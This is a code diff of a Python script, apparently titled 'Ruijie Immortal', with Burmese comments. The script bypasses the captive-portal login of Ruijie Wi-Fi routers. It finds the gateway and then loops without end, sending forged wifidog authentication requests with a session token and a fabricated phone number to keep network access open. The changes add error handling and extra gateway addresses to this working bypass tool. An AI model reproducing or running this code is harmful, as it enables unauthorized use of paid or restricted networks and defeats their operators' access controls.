@@ -44,28 +44,32 @@ class RuijieImmortal:
             return f"{r}Err{w}"
 
     async def start_bypass(self):
+        # ဖိုင်မရှိရင် setup အရင်လုပ်မယ်
         if not os.path.exists(self.ip_file) or not os.path.exists(self.session_url_file):
-            if not run_setup(): return
+            if not run_setup():
+                print(f"{r}[!] Setup မအောင်မြင်ပါ။ Wi-Fi ပြန်စစ်ပါ။{w}")
+                return
 
-        ip = open(self.ip_file).read().strip()
-        url = open(self.session_url_file).read().strip()
+        try:
+            ip = open(self.ip_file).read().strip()
+            url = open(self.session_url_file).read().strip()
+        except Exception as e:
+            print(f"{r}[!] ဖိုင်ဖတ်မရပါ: {e}{w}")
+            return
 
         print(f"{g}[+] Auto-Reconnect & Speed Mode Active{w}")
         
-        # Connection ကို အမြဲပွင့်နေစေရန် keepalive သုံးထားသည်
         conn = aiohttp.TCPConnector(limit=20, keepalive_timeout=60)
         async with aiohttp.ClientSession(connector=conn) as session:
             session_id = None
             
             while True:
-                # Session မရှိလျှင် သို့မဟုတ် ပြုတ်သွားလျှင် အသစ်ပြန်ယူမည် (Auto Reconnect)
                 if session_id is None:
                     print(f"{y}[*] Reconnecting...{w}")
                     session_id = await self.get_session_id(session, url)
                     if session_id: print(f"{g}[+] Reconnected!{w}")
 
                 if session_id:
-                    # လိုင်းပိုကောင်းစေရန် phoneNumber ကို random တိုးပေးသည်
                     params = {'token': session_id, 'phoneNumber': str(int(time.time()))[-6:]}
                     try:
                         async with session.post(f'http://{ip}:2060/wifidog/auth?', params=params, timeout=5) as res:
@@ -75,20 +79,20 @@ class RuijieImmortal:
                             
                             print(f"[{time.strftime('%H:%M:%S')}] Net: {status_text} | Ping: {ping}")
 
-                            # လိုင်းပိုမြန်စေရန် delay ကို အနည်းဆုံး (0.3s) ထားသည်
                             if is_ok:
-                                await asyncio.sleep(0.8) # လိုင်းရနေလျှင် တည်ငြိမ်အောင် ထိန်းသည်
+                                await asyncio.sleep(0.8)
                             else:
-                                await asyncio.sleep(0.3) # လိုင်းမရသေးလျှင် request အမြန်ပို့သည်
+                                await asyncio.sleep(0.3)
                     except:
-                        session_id = None # Connection error ဖြစ်လျှင် အလိုအလျောက် ပြန်ချိတ်ရန် reset လုပ်သည်
+                        session_id = None
                         await asyncio.sleep(1)
                 else:
                     await asyncio.sleep(2)
 
 def run_setup():
     print(f"{y}[*] Searching Router...{w}")
-    gateways = ["192.168.0.1", "192.168.1.1", "10.44.77.240"]
+    # IP List ကို ပိုစုံအောင် ထည့်ထားပေးတယ်
+    gateways = ["192.168.0.1", "192.168.1.1", "10.44.77.240", "192.168.10.1", "192.168.110.1"]
     for gw in gateways:
         try:
             res = requests.get(f"http://{gw}", timeout=4)
@@ -101,16 +105,17 @@ def run_setup():
                 with open(".session_url", "w") as f: f.write(s_url)
                 print(f"{g}[+] Setup OK: {ip}{w}")
                 return True
-        except:
+        except Exception as e:
             continue
     return False
 
 if __name__ == "__main__":
     os.system("clear")
-    print(f"{b}=== Ruijie Immortal V1 (Speed & Reconnect) ==={w}")
+    print(f"{b}=== Ruijie Immortal V1 (Fixed) ==={w}")
     try:
         bot = RuijieImmortal()
         asyncio.run(bot.start_bypass())
     except KeyboardInterrupt:
         print(f"\n{y}[*] User Stopped.{w}")
-      
+    except Exception as e:
+        print(f"{r}[!] Runtime Error: {e}{w}")
